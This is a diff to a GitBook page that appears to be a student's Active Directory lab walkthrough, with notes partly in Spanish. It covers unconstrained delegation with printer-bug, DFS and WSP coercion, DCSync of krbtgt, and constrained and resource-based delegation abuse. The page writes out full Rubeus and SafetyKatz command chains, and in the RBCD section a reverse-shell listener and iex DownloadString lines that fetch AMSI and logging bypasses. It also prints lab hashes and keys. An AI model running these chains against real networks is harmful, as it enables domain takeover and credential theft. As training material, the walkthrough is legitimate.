@@ -371,4 +371,635 @@ Session completed
 
 `svcadmin:*ThisisBlasphemyThisisMadness!!`
 
+***
+
+## Unconstrained Delegation + Coercion Attacks
+
+First, we need to find a server that has unconstrained delegation enabled:
+
+### Search server with (unconstrained delegation)
+
+```
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+. C:\AD\Tools\PowerView.ps1
+Get-DomainComputer -Unconstrained | select -ExpandProperty name
+```
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+Since the prerequisite for elevation using Unconstrained delegation is having admin access to the machine, we need to compromise a user which has local admin access on appsrv.&#x20;
+
+> Recall that we extracted secrets of appadmin, srvadmin and websvc from dcorp-adminsrv.&#x20;
+
+Let’s check if anyone of them have local admin privileges on dcorp-appsrv.
+
+### Check local admins in dcorp-appsrv
+
+> To that, we will need to check all users and hashes previusly obtained&#x20;
+>
+> Like for example appadmin
+
+```
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+Run the below commands in the new process:
+
+```
+C:\Windows\system32> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+PS C:\Windows\system32> . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
+PS C:\Windows\system32> Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local
+dcorp-appsrv
+dcorp-adminsrv
+```
+
+Sweet! We now have admin <mark style="background-color:yellow;">access to the machine that has unconstrained delegation.</mark>
+
+### Execute Rubeus using Loader and winrs
+
+Run the below command from the process running appadmin:
+
+```
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Y
+```
+
+Run Rubeus in listener mode in the winrs session on dcorp-appsrv:
+
+> Connect to the machine dcorp-appsrv
+
+```
+C:\Windows\system32> winrs -r:dcorp-appsrv cmd
+```
+
+After obtaining a cmd, do the portforward
+
+```
+Microsoft Windows [Version 10.0.20348.1249]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\appadmin> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.53
+```
+
+> Remember change the IP
+>
+> > Remember upload too the Rubeus to us webserver
+> >
+> > ![](<../../.gitbook/assets/image (5).png>)
+
+Execute Rubeus
+
+```
+C:\Users\appadmin> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
+
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  V2.2.1
+
+[*] Action: TGT Monitoring
+[*] Target user     : DCORP-DC$
+[*] Monitoring every 5 seconds for new TGTs
+```
+
+> * Deja la ventana de winrs en dcorp-appsrv **abierta** con el monitor de Rubeus corriendo.
+> * Abre **otra cmd** en tu máquina student.
+> * Ejecuta el comando de Printer Bug de arriba.
+
+#### Option 1 - Use the Printer Bug for Coercion
+
+<mark style="background-color:yellow;">On the student VM</mark>, use MS-RPRN to force authentication from dcorp-dc$ (Traffic on TCP port 445 from student VM to dcorp-dc and dcorp-dc to dcorp-appsrv required)
+
+```
+C:\AD\Tools> C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
+RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.
+```
+
+#### **Option 2 – Windows Search Protocol**
+
+```
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\WSPCoerce.exe -args DCORP-DC DCORP-APPSRV
+```
+
+#### **Option 3 – DFS Namespace**
+
+```
+C:\AD\Tools\DFSCoerce-andrea.exe -t dcorp-dc -l dcorp-appsrv
+```
+
+### Optain the TGT&#x20;
+
+After execute some of these options, on the Rubeus listener (dcorp-appsrv), we can see the TGT of dcorp-dc$:
+
+```
+[*] Monitoring every 5 seconds for new TGTs
+
+[*] 3/3/2023 5:22:53 PMPM UTC - Found new TGT:
+
+  User                  :  DCORP-DC$@DOLLARCORP.MONEYCORP.LOCAL
+  StartTime             :  3/3/2023 2:16:37 AM
+  EndTime               :  3/3/2023 12:15:31 PM
+  RenewTill             :  3/10/2023 2:15:31 AM
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  Base64EncodedTicket   :
+
+    doIFxTCC..
+
+[snip]
+```
+
+<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+<mark style="background-color:yellow;">Copy the base64 encoded ticket and use it with Rubeus on student VM.</mark>&#x20;
+
+### Importar the ticket and do DCSync (Domain Admin)
+
+Run the below command from an elevated shell as the SafetyKatz command that we will use for DCSync needs to be run from an elevated process:
+
+```
+C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:doIFx…
+[snip]
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+```
+
+> Remember replace the ticket ... to base64 previusly getting
+
+Now, we can run DCSync from this process:
+
+> All it from VM machine
+
+```
+C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
+
+[snip]
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 11/11/2022 9:59:41 PM
+Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986
+    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
+    lm  - 0: ea03581a1268674a828bde6ab09db837
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 6d4cc4edd46d8c3d3e59250c91eac2bd
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
+      aes128_hmac       (4096) : e74fa5a9aa05b2c0b2d196e226d8820e
+
+[snip]
+```
+
+Great!
+
+### Escalada a Enterprise Admin (repetición contra mcorp-dc)
+
+To get Enterprise Admin privileges, we need to force authentication from `mcorp-dc`.&#x20;
+
+> Repite los mismos pasos pero ahora contra mcorp-dc$:
+
+Run the below command to listen for `mcorp-dc$` tickets on `dcorp-appsrv`:
+
+```
+C:\Windows\system32> winrs -r:dcorp-appsrv cmd
+Microsoft Windows [Version 10.0.20348.1249]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\appadmin> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args monitor /targetuser:MCORP-DC$ /interval:5 /nowrap
+
+C:\Users\Public\Rubeus.exe monitor /targetuser:MCORP-DC$ /interval:5 /nowrap
+  ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  V2.2.1
+
+[*] Action: TGT Monitoring
+[*] Target user     : MCORP-DC$
+[*] Monitoring every 5 seconds for new TGTs
+```
+
+Use MS-RPRN on the student VM to trigger authentication from `mcorp-dc` to `dcorp-appsrv`:
+
+```
+C:\AD\Tools> C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
+RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC server is unavailable.
+```
+
+> **Alternatively**, we can also use MS-DFSNM or MS-WSP (note that we are not using FQDN of mcorp-dc in case of WSPCoerce):
+>
+> ```
+> C:\AD\Tools> C:\AD\Tools\DFSCoerce-andrea.exe -t mcorp-dc.moneycorp.local -l dcorp-appsrv.dollarcorp.moneycorp.local
+>
+> C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\WSPCoerce.exe -args mcorp-dc dcorp-appsrv.dollarcorp.moneycorp.local
+> ```
+
+On the Rubeus listener, we can see the TGT of mcorp-dc$:
+
+```
+[*] Monitoring every 5 seconds for new TGTs
+
+[*] 3/3/2023 5:32:23 PM UTC - Found new TGT:
+
+  User                  :  MCORP-DC$@MONEYCORP.LOCAL
+
+[snip]
+```
+
+As previously, copy the base64 encoded ticket and use it with Rubeus on student VM. Run the below command from an elevated shell as the SafetyKatz command that we will use for DCSync needs to be run from an elevated process:
+
+```
+C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:doIFx…
+[snip]
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+
+Now, we can run DCSync from this process:
+
+C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
+
+[snip]
+```
+
+Awesome ! We escalated to Enterprise Admins too!
+
+***
+
+## Abusing Constrained Delegation (S4U2Self + S4U2Proxy)
+
+### Enumerate Users with Constrained Delegation
+
+```
+C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
+. C:\AD\Tools\PowerView.ps1
+Get-DomainUser -TrustedToAuth
+```
+
+<figure><img src="../../.gitbook/assets/image (569).png" alt=""><figcaption></figcaption></figure>
+
+> websvc → Tiene Constrained Delegation hacia CIFS/dcorp-mssql.dollarcorp.moneycorp.local
+
+And we already have secrets/tgt of websvc from dcorp-admisrv machine. We can use Rubeus to abuse that.
+
+### Abuse Constrained Delegation using websvc with Rubeus
+
+In the below command, we request a TGS for websvc as the Domain Administrator - Administrator. Then the TGS used to access the service specified in the `/msdsspn` parameter (which is filesystem on dcorp-mssql):
+
+> * Pide un TGT para websvc
+> * Hace **S4U2Self** → se hace pasar por Administrator
+> * Hace **S4U2Proxy** → obtiene un ticket para el servicio CIFS en dcorp-mssql
+> * Usa /msdsspn para especifcar el path&#x20;
+> * Inyecta el ticket con /ptt
+
+```
+C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+v2.2.1
+
+[*] Action: S4U
+
+[*] Using aes256_cts_hmac_sha1 hash: 2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7
+[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\websvc'
+[*] Using domain controller: 172.16.2.1:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIFSjCCBUagAwIBBaED [snip]
+
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'websvc@DOLLARCORP.MONEYCORP.LOCAL'
+[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
+[*] Sending S4U2self request to 172.16.2.1:88
+[+] S4U2self success!
+[*] Got a TGS for 'Administrator' to 'websvc@DOLLARCORP.MONEYCORP.LOCAL'
+[*] base64(ticket.kirbi):
+
+      doIGHDCCBhigAwIBBaED [snip]
+
+[+] Ticket successfully imported!
+[*] Impersonating user 'Administrator' to target SPN 'CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL'
+[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
+[*] Building S4U2proxy request for service: 'CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL'
+[*] Sending S4U2proxy request
+[+] S4U2proxy success!
+[*] base64(ticket.kirbi) for SPN 'CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL':
+
+      doIHYzCCB1+gAwIBBaED [snip]
+
+[+] Ticket successfully imported!
+```
+
+Check if the TGS is injected:
+
+```
+C:\AD\Tools> klist
+
+Current LogonId is 0:0x1184e6d
+
+Cached Tickets: (1)
+
+#0>     Client: Administrator @ DOLLARCORP.MONEYCORP.LOCAL
+        Server: CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
+[snip]
+```
+
+Try accessing filesystem on dcorp-mssql:
+
+```
+C:\AD\Tools> dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
+
+Volume in drive \\dcorp-mssql.dollarcorp.moneycorp.local\c$ has no label.
+ Volume Serial Number is 98C0-23AE
+
+ Directory of \\dcorp-mssql.dollarcorp.moneycorp.local\c$
+
+05/08/2021  12:15 AM    <DIR>          PerfLogs
+11/14/2022  04:44 AM    <DIR>          Program Files
+11/14/2022  04:43 AM    <DIR>          Program Files (x86)
+11/15/2022  08:06 AM    <DIR>          Transcripts
+11/15/2022  01:48 AM    <DIR>          Users
+11/11/2022  05:22 AM    <DIR>          Windows
+               0 File(s)              0 bytes
+               6 Dir(s)   6,214,402,048 bytes free
+```
+
+For the next task, enumerate the computer accounts with coenstrained delegation enabled using PowerView:
+
+```
+PS C:\AD\Tools> Get-DomainComputer -TrustedToAuth
+
+pwdlastset                    : 11/11/2022 11:16:12 PM
+logoncount                    : 60
+badpasswordtime               : 12/31/1600 4:00:00 PM
+distinguishedname             : CN=DCORP-ADMINSRV,OU=Applocked,DC=dollarcorp,DC=moneycorp,DC=local
+objectclass                   : {top, person, organizationalPerson, user...}
+lastlogontimestamp            : 2/24/2023 12:45:04 AM
+whencreated                   : 11/12/2022 7:16:12 AM
+samaccountname                : DCORP-ADMINSRV$
+localpolicyflags              : 0
+codepage                      : 0
+samaccounttype                : MACHINE_ACCOUNT
+whenchanged                   : 3/3/2023 10:39:12 AM
+accountexpires                : NEVER
+countrycode                   : 0
+operatingsystem               : Windows Server 2022 Datacenter
+instancetype                  : 4
+useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
+objectguid                    : 2e036483-7f45-4416-8a62-893618556370
+operatingsystemversion        : 10.0 (20348)
+lastlogoff                    : 12/31/1600 4:00:00 PM
+msds-allowedtodelegateto      : {TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC}
+objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
+dscorepropagationdata         : {11/15/2022 4:16:45 AM, 1/1/1601 12:00:00 AM}
+serviceprincipalname          : {WSMAN/dcorp-adminsrv, WSMAN/dcorp-adminsrv.dollarcorp.moneycorp.local, TERMSRV/DCORP-ADMINSRV, TERMSRV/dcorp-adminsrv.dollarcorp.moneycorp.local...}
+usncreated                    : 13891
+usnchanged                    : 119138
+lastlogon                     : 3/3/2023 9:31:15 AM
+badpwdcount                   : 0
+cn                            : DCORP-ADMINSRV
+msds-supportedencryptiontypes : 28
+objectsid                     : S-1-5-21-719815819-3726368948-3917688648-1105
+
+[snip]
+```
+
+### Abuse Constrained Delegation using dcorp-adminsrv$ with Rubeus <a href="#abuse-constrained-delegation-using-dcorp-adminsrv-with-rubeus" id="abuse-constrained-delegation-using-dcorp-adminsrv-with-rubeus"></a>
+
+We have the AES keys of dcorp-adminsrv$ from dcorp-adminsrv machine. Run the below command from an elevated command prompt as SafetyKatz, that we will use for DCSync, would need that:
+
+> dcorp-adminsrv$: e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51
+
+```
+C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  V2.2.1
+
+[*] Action: S4U
+
+[*] Using aes256_cts_hmac_sha1 hash: e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51
+[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\dcorp-adminsrv$'
+[*] Using domain controller: 172.16.2.1:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+[snip]
+
+[*] Impersonating user 'Administrator' to target SPN 'time/dcorp-dc.dollarcorp.moneycorp.LOCAL'
+[*]   Final ticket will be for the alternate service 'ldap'
+[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
+[*] Building S4U2proxy request for service: 'time/dcorp-dc.dollarcorp.moneycorp.LOCAL'
+[*] Sending S4U2proxy request
+[+] S4U2proxy success!
+[*] Substituting alternative service name 'ldap'
+[*] base64(ticket.kirbi) for SPN 'ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL': [snip]
+[+] Ticket successfully imported!
+```
+
+Run the below command to abuse the LDAP ticket:
+
+```
+C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
+
+[snip]
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 11/11/2022 9:59:41 PM
+Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 4e9815869d2090ccfca61c1fe0d23986
+    ntlm- 0: 4e9815869d2090ccfca61c1fe0d23986
+    lm  - 0: ea03581a1268674a828bde6ab09db837
+
+[snip]
+```
+
+***
+
+## Resource-Based Constrained Delegation
+
+Let’s use PowerView from a PowerShell session started using Invisi-Shell to enumerate Write permissions for a user that we have compromised.&#x20;
+
+```
+C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
+. C:\AD\Tools\PowerView.ps1
+```
+
+After trying from multiple users or using BloodHound we would know <mark style="background-color:yellow;">that the user ciadmin has Write permissions on the computer object of dcorp-mgmt</mark>:
+
+<pre><code>C:\AD\Tools> Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
+
+ObjectDN                : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
+<a data-footnote-ref href="#user-content-fn-1">AceQualifier            : AccessAllowed</a>
+ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite
+ObjectAceType           : None
+AceFlags                : None
+AceType                 : AccessAllowed
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-719815819-3726368948-3917688648-1121
+IdentityReferenceName   : ciadmin
+IdentityReferenceDomain : dollarcorp.moneycorp.local
+IdentityReferenceDN     : CN=ci admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
+IdentityReferenceClass  : user
+</code></pre>
+
+> Recall that we compromised ciadmin from dcorp-ci.&#x20;
+
+We can either use the reverse shell we have on dcorp-ci as ciadmin or extract the credentials from dcorp-ci.&#x20;
+
+Let’s use the reverse shell (Jenkins) that we have and load PowerView there:
+
+> Remember do the bypass in it machine (sblogin, amsi, etc...)
+
+```
+C:\Users\studentx> C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443
+listening on [any] 443 ...
+connect to [172.16.100.1] from (UNKNOWN) [172.16.3.11] 51192: NO_DATA
+
+[snip]
+
+PS C:\Users\Administrator\.jenkins\workspace\projectx> iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/sbloggingbypass.txt')
+PS C:\Users\Administrator\.jenkins\workspace\projectx> iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/Amsi-Byp.txt')
+PS C:\Users\Administrator\.jenkins\workspace\projectx> iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.x/PowerView.ps1')
+```
+
+Now, configure RBCD on dcorp-mgmt for the student VMs.&#x20;
+
+You may like to set it for all the student VMs in your lab instance so that your fellow students can also abuse RBCD:
+
+Your student VM hostname could be dcorp-studentX or dcorp-stdX.
+
+```
+PS C:\Users\Administrator\.jenkins\workspace\projectx> Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-std453$' -Verbose
+```
+
+> Change; dcorp-student453$ to dcorp-std453$ (now us users has it names)
+
+Check if RBCD is set correctly:
+
+> If it dosent worked, its likely to be we didnt do the before step well
+
+```
+PS C:\Users\Administrator\.jenkins\workspace\projectx> Get-DomainRBCD
+
+SourceName                 : DCORP-MGMT$
+SourceType                 : MACHINE_ACCOUNT
+SourceSID                  : S-1-5-21-719815819-3726368948-3917688648-1108
+SourceAccountControl       : WORKSTATION_TRUST_ACCOUNT
+SourceDistinguishedName    : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
+ServicePrincipalName       : {WSMAN/dcorp-mgmt, WSMAN/dcorp-mgmt.dollarcorp.moneycorp.local, TERMSRV/DCORP-MGMT,
+                             TERMSRV/dcorp-mgmt.dollarcorp.moneycorp.local...}
+DelegatedName              : DCORP-studentx$
+DelegatedType              : MACHINE_ACCOUNT
+DelegatedSID               : S-1-5-21-719815819-3726368948-3917688648-4110
+DelegatedAccountControl    : WORKSTATION_TRUST_ACCOUNT
+DelegatedDistinguishedName : CN=DCORP-studentx,OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local
+
+[snip]
+```
+
+Get AES keys <mark style="background-color:yellow;">of your student VM</mark> (as we configured RBCD for it above). Run the below command from an elevated shell:
+
+```
+C:\Windows\system32> C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
+
+[snip]
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DCORP-STD453$
+Domain            : dcorp
+Logon Server      : (null)
+Logon Time        : 4/12/2026 5:04:09 AM
+SID               : S-1-5-18
+
+         * Username : dcorp-std453$
+         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       5c805d75e761664230108bb332ae7835310b48b3636368ca74a09e94a470286c
+           rc4_hmac_nt       0f541b805d8d6a548ed75ce06e850469
+           rc4_hmac_old      0f541b805d8d6a548ed75ce06e850469
+           rc4_md4           0f541b805d8d6a548ed75ce06e850469
+           rc4_hmac_nt_exp   0f541b805d8d6a548ed75ce06e850469
+           rc4_hmac_old_exp  0f541b805d8d6a548ed75ce06e850469
+
+[snip]
+```
+
+> dcorp-std453$:
+>
+> 5c805d75e761664230108bb332ae7835310b48b3636368ca74a09e94a470286c
+
+With Rubeus, abuse the RBCD to access `dcorp-mgmt` as Domain Administrator - Administrator:
+
+```
+C:\Windows\system32> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-std453$ /aes256:5c805d75e761664230108bb332ae7835310b48b3636368ca74a09e94a470286c /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
+[snip]
+
+[*] Impersonating user 'administrator' to target SPN 'http/dcorp-mgmt'
+[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
+
+[snip]
+```
+
+Check if we can access dcorp-mgmt:
+
+```
+C:\Windows\system32> winrs -r:dcorp-mgmt cmd
+Microsoft Windows [Version 10.0.20348.1249]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator.dcorp> set username
+
+Set username
+USERNAME = administrator
+
+C:\Users\Administrator.dcorp> set computername
+
+Set computername
+COMPUTERNAME=dcorp-mgmt
+```
+
 [^1]: 
